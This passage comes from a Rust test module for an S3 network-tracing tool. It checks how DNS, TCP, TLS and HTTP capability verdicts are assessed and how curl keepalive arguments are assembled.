        assert_eq!(normalize_endpoint("http://127.0.0.1:9000"), "http://127.0.0.1:9000");
    }

    #[test]
    fn local_detection() {
        assert!(is_local("127.0.0.1"));
        assert!(is_local("localhost"));
        assert!(!is_local("s3.amazonaws.com"));
        assert!(!is_local("minio.example.com"));
    }

    #[test]
    fn assess_reports_pass_only_with_a_record() {
        let caps = assess(&[], &[]);
        assert!(caps.dns.is_none() && caps.tcp.is_none() && caps.tls.is_none() && caps.http.is_none());
    }

    fn dns_fact() -> s3tap_schema::Dns {
        s3tap_schema::Dns {
            latency_ns: 2_500_000,
            cache_hit: false,
            resolved_ip: Some("52.0.0.1".into()),
            n_answers: 1,
            ttl_s: Some(60),
            via: "getaddrinfo".into(),
        }
    }

    // A populated conn+op ⇒ all four capabilities PASS. Guards the core verdict
    // (the four `assess` finders) against silent regression.
    #[test]
    fn assess_all_pass_with_a_full_record() {
        let conn = Connection {
            partial: false,
            tcp_connect_ns: Some(1_200_000),
            dns: Some(dns_fact()),
            tls: s3tap_schema::Tls { seen: true, sni: Some("s3.amazonaws.com".into()), ..Default::default() },
            ..Default::default()
        };
        let op = Operation {
            verb: Some("GET".into()),
            s3_op: Some("ListBuckets".into()),
            http_status: Some(403),
            ..Default::default()
        };
        let caps = assess(&[conn], &[op]);
        assert!(caps.dns.is_some(), "DNS");
        assert!(caps.tcp.is_some(), "TCP");
        assert!(caps.tls.is_some(), "TLS");
        assert!(caps.http.is_some(), "HTTP");
    }

    // The TCP rule is OBSERVED-connect, not measured-latency: a non-partial conn
    // with no `tcp_connect_ns` (loopback connect rounds to 0 ns ⇒ None) must still
    // PASS TCP. Regression guard for the "TCP-cap-on-!partial" fix.
    #[test]
    fn assess_tcp_passes_on_observed_connect_without_latency() {
        let conn = Connection { partial: false, tcp_connect_ns: None, ..Default::default() };
        let caps = assess(&[conn], &[]);
        assert!(caps.tcp.is_some(), "non-partial conn ⇒ TCP PASS even with no latency");
        assert_eq!(caps.tcp.as_deref(), Some("connected (latency unmeasured)"));
    }

    // A partial-only conn (never saw connect) must NOT pass TCP.
    #[test]
    fn assess_tcp_fails_when_only_partial_conns() {
        let conn = Connection { partial: true, tcp_connect_ns: Some(1_000_000), ..Default::default() };
        let caps = assess(&[conn], &[]);
        assert!(caps.tcp.is_none(), "partial-only ⇒ no observed connect ⇒ TCP FAIL");
    }

    // A REFUSED/failed connect is observed (partial=false) but connect_failed=true —
    // it never reached ESTABLISHED, so TCP must FAIL, not falsely report "connected".
    #[test]
    fn assess_tcp_fails_on_a_refused_connect() {
        let conn = Connection { partial: false, connect_failed: true, ..Default::default() };
        let caps = assess(&[conn], &[]);
        assert!(caps.tcp.is_none(), "observed-but-failed connect ⇒ TCP FAIL");
    }

    // A TLS handshake seen but no SNI parsed ⇒ TLS FAILs (SNI is the evidence the
    // ClientHello probe fired, which is what the capability asserts).
    #[test]
    fn assess_tls_needs_sni_not_just_seen() {
        let conn = Connection {
            partial: false,
            tls: s3tap_schema::Tls { seen: true, sni: None, ..Default::default() },
            ..Default::default()
        };
        let caps = assess(&[conn], &[]);
        assert!(caps.tls.is_none(), "seen-without-SNI ⇒ TLS FAIL");
    }

    // DNS is informational: a run with TCP+TLS+HTTP but no DNS (nscd resolver) must
    // still PASS the verdict, while a missing required cap fails it (review M7).
    #[test]
    fn verdict_treats_dns_as_informational() {
        let pass = |dns: bool, tcp: bool, tls: bool, http: bool| {
            verdict_ok(&Caps {
                dns: dns.then(|| "d".to_string()),
                tcp: tcp.then(|| "t".to_string()),
                tls: tls.then(|| "l".to_string()),
                http: http.then(|| "h".to_string()),
            })
        };
        assert!(pass(false, true, true, true), "no DNS but TCP/TLS/HTTP ⇒ PASS");
        assert!(pass(true, true, true, true), "all four ⇒ PASS");
        assert!(!pass(true, false, true, true), "missing TCP ⇒ FAIL");
        assert!(!pass(true, true, false, true), "missing TLS ⇒ FAIL");
        assert!(!pass(true, true, true, false), "missing HTTP ⇒ FAIL");
    }

    // HTTP needs BOTH a verb and a status (a half-parsed op shouldn't PASS).
    #[test]
    fn assess_http_needs_verb_and_status() {
        let verb_only = Operation { verb: Some("GET".into()), http_status: None, ..Default::default() };
        assert!(assess(&[], &[verb_only]).http.is_none(), "verb without status ⇒ FAIL");
        let status_only = Operation { verb: None, http_status: Some(200), ..Default::default() };
        assert!(assess(&[], &[status_only]).http.is_none(), "status without verb ⇒ FAIL");
    }

    #[test]
    fn keepalive_pairs_each_url_with_its_own_dev_null() {
        // Regression (caught in live validation): curl pairs each `-o` with the next `--url`,
        // so every one of the N URLs needs its own `-o /dev/null` or the object bodies leak
        // to stdout and pollute the report. Pin one `-o`+`/dev/null` per `--url`.
        let seq = ["https://h/o"; 5];
        let args = keepalive_curl_args(&seq);
        let count = |needle: &str| args.iter().filter(|a| a.as_str() == needle).count();
        assert_eq!(count("--url"), 5);
        assert_eq!(count("-o"), 5, "one -o per url, else curl dumps N-1 bodies to stdout");
        assert_eq!(count("/dev/null"), 5);
        assert_eq!(count("--http1.1"), 1, "fixed flags stay singular");
        // The argv issues exactly the URLs handed in, in order.
        let urls: Vec<&str> = args.windows(2).filter(|w| w[0] == "--url").map(|w| w[1].as_str()).collect();
        assert_eq!(urls, vec!["https://h/o"; 5]);
    }

    #[test]
    fn rotate_cycles_distinct_objects_one_per_request() {
        // --rotate: the request sequence cycles the endpoint set round-robin (cold-fetch),
        // while the default uses the first object every time (warm). Build the same sequence
        // drive_keepalive does and pin both shapes via keepalive_curl_args.
        let eps = ["https://h/a".to_string(), "https://h/b".to_string(), "https://h/c".to_string()];
        let seq = |rotate: bool, n: usize| -> Vec<&str> {
            (0..n).map(|i| eps[if rotate { i % eps.len() } else { 0 }].as_str()).collect()
        };
        // rotate: a,b,c,a,b across 5 requests
        let rot = keepalive_curl_args(&seq(true, 5));
        let urls: Vec<&str> = rot.windows(2).filter(|w| w[0] == "--url").map(|w| w[1].as_str()).collect();
        assert_eq!(urls, vec!["https://h/a", "https://h/b", "https://h/c", "https://h/a", "https://h/b"]);
        // no rotate: first object every time
        let warm = keepalive_curl_args(&seq(false, 4));
        let warm_urls: Vec<&str> = warm.windows(2).filter(|w| w[0] == "--url").map(|w| w[1].as_str()).collect();
        assert_eq!(warm_urls, vec!["https://h/a"; 4]);
    }
}
